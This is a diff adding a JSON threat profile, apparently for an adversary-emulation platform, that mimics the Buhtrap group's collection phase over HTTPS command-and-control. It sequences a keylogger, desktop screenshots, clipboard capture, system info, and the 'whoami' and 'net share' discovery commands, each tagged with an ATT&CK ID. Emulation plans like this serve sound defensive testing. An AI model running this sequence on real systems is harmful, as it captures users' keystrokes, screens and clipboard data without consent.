@@ -1,0 +1,161 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "Short-haul C2 over HTTPS for the collection portion of Buhtrap Adversary Emulation",
+        "display_name": "Buhtrap-HTTPS",
+        "name": "Buhtrap-HTTPS",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": {
+                    "--cp": "127.0.0.1:443",
+                    "--multipart": 10240,
+                    "--secure": true
+                },
+                "module": "https",
+                "type": "initialization",
+                "xrand": "a3214a8b079507df7647074f5c23a75e"
+            },
+            "1": {
+                "module": "loader",
+                "module_to_load": "keylogger",
+                "request": "--load keylogger",
+                "type": "message",
+                "xrand": "d3ac4ee07c6f834c39b10cc5fc2ecf52"
+            },
+            "2": {
+                "depends_on": "8085957f-b422-48cb-960b-1f077790299d",
+                "module": "keylogger",
+                "request": "--start",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0009",
+                    "att&ck-technique:T1056"
+                ],
+                "type": "message",
+                "xrand": "d04be801de47d20bfdd58b5a815d7b7e"
+            },
+            "3": {
+                "module": "loader",
+                "module_to_load": "printscr",
+                "request": "--load printscr",
+                "type": "message",
+                "xrand": "4603235fea5d884a2e1cf7f2e3a505fe"
+            },
+            "4": {
+                "depends_on": "4346510a-3dad-4302-8572-2bcdc8bc2e2c",
+                "module": "printscr",
+                "request": "--window Desktop",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0009",
+                    "att&ck-technique:T1113"
+                ],
+                "type": "message",
+                "xrand": "af00325a12fe14f888fb2121cb751071"
+            },
+            "5": {
+                "module": "loader",
+                "module_to_load": "clipboard",
+                "request": "--load clipboard",
+                "type": "message",
+                "xrand": "ffe1d934c15e79fe5ffffc22d354052f"
+            },
+            "6": {
+                "depends_on": "833ad3b4-679c-4078-8153-cf4d6f979b8b",
+                "module": "clipboard",
+                "request": "",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0009",
+                    "att&ck-technique:T1115"
+                ],
+                "type": "message",
+                "xrand": "592588b8af3d9a32ab21933d2dd97eac"
+            },
+            "7": {
+                "module": "loader",
+                "module_to_load": "sysinfo",
+                "request": "--load sysinfo",
+                "type": "message",
+                "xrand": "0470401b67af395c1a2d28e04f2a857c"
+            },
+            "8": {
+                "depends_on": "14ba9c44-45b7-4630-b252-ad578faaeba9",
+                "module": "sysinfo",
+                "request": "",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1082"
+                ],
+                "type": "message",
+                "xrand": "7331bd66bd575932180fa83a68bbc8e0"
+            },
+            "9": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message",
+                "xrand": "57833172b80145b4219b2738cafe5c45"
+            },
+            "10": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "whoami",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1033"
+                ],
+                "type": "message",
+                "xrand": "7f8d609d7157d7d05135fba67680e8b0"
+            },
+            "11": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c net share",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1135"
+                ],
+                "type": "message",
+                "xrand": "5aced39232190680a4e56b9519ab5182"
+            },
+            "12": {
+                "depends_on": "5a720284-cf76-4f68-a5ac-b6a4f027a156",
+                "module": "keylogger",
+                "request": "--current",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0009",
+                    "att&ck-technique:T1056"
+                ],
+                "type": "message",
+                "xrand": "4d68f8fa50250179073735caf4496243"
+            },
+            "13": {
+                "depends_on": "5a720284-cf76-4f68-a5ac-b6a4f027a156",
+                "module": "keylogger",
+                "request": "--stop",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0009",
+                    "att&ck-technique:T1056"
+                ],
+                "type": "message",
+                "xrand": "85e3383a7c6b47f46dc40d6c1de5afe5"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29"
+    }
+}
